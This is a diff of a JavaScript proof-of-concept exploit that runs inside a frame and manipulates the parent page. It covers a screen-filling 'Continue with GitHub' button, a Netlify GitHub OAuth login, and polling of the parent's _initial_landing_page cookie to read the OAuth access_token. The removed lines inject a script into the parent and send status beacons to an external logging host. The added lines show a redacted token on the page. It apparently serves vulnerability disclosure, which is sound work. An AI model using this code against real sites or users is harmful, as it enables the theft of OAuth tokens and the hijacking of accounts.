@@ -1,99 +1,87 @@
 (() => {
   const d = parent.document;
-  const s = d.createElement("script");
+  const w = parent;
 
-  s.textContent = `
-    (() => {
-      const collector =
-        "https://http-log-collector.netlify.app/api/log";
+  const button = d.createElement("button");
+  button.textContent = "Continue with GitHub";
+  button.style.cssText = [
+    "position:fixed",
+    "inset:0",
+    "z-index:2147483647",
+    "font-size:48px",
+    "cursor:pointer"
+  ].join(";");
 
-      function log(step, detail = "") {
-        const u = new URL(collector);
-        u.searchParams.set("s", step);
-        if (detail) u.searchParams.set("d", detail);
-        u.searchParams.set("_", Date.now() + Math.random());
-        new Image().src = u;
-      }
+  button.onclick = () => {
+    w.open(
+      "https://api.netlify.com/auth" +
+        "?provider=github" +
+        "&site_id=app.netlify.com" +
+        "&login=true" +
+        "&entry_point=direct" +
+        "&redirect=" +
+        encodeURIComponent("https://www.netlify.com/") +
+        "&use_redirect=true",
+      "_blank",
+      "noopener"
+    );
 
-      document.getElementById("parent-control-poc")?.remove();
+    button.textContent = "Waiting for OAuth redirect…";
 
-      const button = document.createElement("button");
-      button.id = "parent-control-poc";
-      button.textContent = "Continue with GitHub";
-      button.style.cssText =
-        "position:fixed;inset:0;width:100vw;height:100vh;" +
-        "z-index:2147483647;font-size:48px;cursor:pointer";
+    let attempts = 0;
 
-      button.onclick = () => {
-        log("parent-click-handler-ran");
+    function readAfterRedirect() {
+      attempts++;
 
-        window.open(
-          "https://api.netlify.com/auth" +
-          "?provider=github" +
-          "&site_id=app.netlify.com" +
-          "&login=true" +
-          "&entry_point=direct" +
-          "&redirect=" +
-          encodeURIComponent("https://www.netlify.com/") +
-          "&use_redirect=true",
-          "_blank",
-          "noopener"
+      const cookieMatch = d.cookie.match(
+        /(?:^|;\s*)_initial_landing_page=([^;]*)/
+      );
+
+      if (cookieMatch) {
+        let landingPage = cookieMatch[1];
+
+        try {
+          landingPage = decodeURIComponent(landingPage);
+        } catch {}
+
+        const tokenMatch = landingPage.match(
+          /(?:^|[?#&])access_token=([^&#]+)/
         );
 
-        let attempt = 0;
+        if (tokenMatch) {
+          const token = tokenMatch[1];
+          const redacted =
+            token.slice(0, 4) + "…" + token.slice(-4);
 
-        function inspect() {
-          attempt++;
+          button.textContent =
+            "OAuth completed\n" +
+            "Token readable: " + redacted + "\n" +
+            "Length: " + token.length;
 
-          try {
-            const match = document.cookie.match(
-              /(?:^|;\\s*)_initial_landing_page=([^;]*)/
-            );
-
-            let tokenReadable = false;
-
-            if (match) {
-              let value = match[1];
-
-              try {
-                value = decodeURIComponent(value);
-              } catch {}
-
-              tokenReadable =
-                /(?:^|[?#&])access_token=[^&#]+/.test(value);
-            }
-
-            log(
-              "parent-check",
-              "attempt=" + attempt +
-              ",cookieReadable=" + Boolean(match) +
-              ",tokenReadable=" + tokenReadable
-            );
-
-            if (tokenReadable) {
-              log("parent-control-demonstrated");
-              button.remove();
-              return;
-            }
-          } catch (error) {
-            log("parent-check-error", error.message);
-          }
-
-          if (attempt < 120) {
-            window.setTimeout(inspect, 1000);
-          } else {
-            log("parent-check-timeout");
-          }
+          return;
         }
+      }
 
-        window.setTimeout(inspect, 1000);
-      };
+      if (attempts < 120) {
+        w.setTimeout(readAfterRedirect, 1000);
+      } else {
+        button.textContent =
+          "Timed out: cookie/token was not readable";
+      }
+    }
 
-      document.body.appendChild(button);
-      log("parent-button-installed");
-    })();
-  `;
+    /*
+     * Check when focus returns from the OAuth window, while retaining
+     * polling as a fallback.
+     */
+    w.addEventListener(
+      "focus",
+      () => w.setTimeout(readAfterRedirect, 250),
+      { once: true }
+    );
 
-  (d.head || d.documentElement).appendChild(s);
-  s.remove();
+    w.setTimeout(readAfterRedirect, 1000);
+  };
+
+  d.body.appendChild(button);
 })();
